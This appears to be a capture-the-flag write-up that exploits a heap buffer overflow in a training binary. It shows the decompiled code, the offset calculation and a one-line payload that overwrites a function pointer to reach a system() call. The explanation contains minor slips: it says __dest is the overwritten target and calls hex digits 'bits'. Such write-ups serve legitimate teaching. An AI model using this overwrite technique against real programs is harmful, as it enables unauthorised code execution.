This binary calls malloc two times, and then the function m() is passed into a pointer and is executed. What we are looking for is the function n(), which uses system(). As such, the idea here is to make the main function call n(), and to do that we will **exploit strcpy() since it has no verification of the length of the input:** this is a **heap buffer overflow**.

1. Get the address of n() in Ghidra:

```
08048454 <n>:
```

2. Understand the binary


```C
void main(undefined4 param_1,int param_2)
{
  char *__dest;
  undefined4 *puVar1;
  
  __dest = malloc(0x40);    //64 in hexadecimal
  puVar1 = malloc(4);       //4 bytes allocation
  *puVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));   //copy input
  (*(code *)*puVar1)();
  return;
}
```

Let's check what is strcpy() behavior in the manual:

```C
char *strcpy(char *restrict dst, const char *restrict src);

```

```
  strcpy()
              These functions copy the string pointed to by src, into a string
              at  the buffer pointed to by dst.  The programmer is responsible
              for allocating a  destination  buffer  large  enough,  that  is,
              strlen(src)  + 1.  For the difference between the two functions,
              see RETURN VALUE.

```

So the source string is our argv[1] (param_2 in the main), and the destination buffer is only 64 bytes. We can deduce that we will inject our attack in the argument of the ELF, and make the destination overflow so that we can overwrite __dest with the address of n().

3. Let's attack:

As such, the payload will follow this pattern:

```
./level6 payload
```

For the offset:
```
malloc(64)                                       = 0x0804a008
malloc(4)                                        = 0x0804a050
```
We look at the last two bits since they are different from each other. 0x50 is 80, and 0x08 is 8, so the difference between the two malloc is 72.

Therefore:

```
./level6 $(python -c 'print "F" * 72 + "\x54\x84\x04\x08"')
```

We now have the flag to go to the next level.
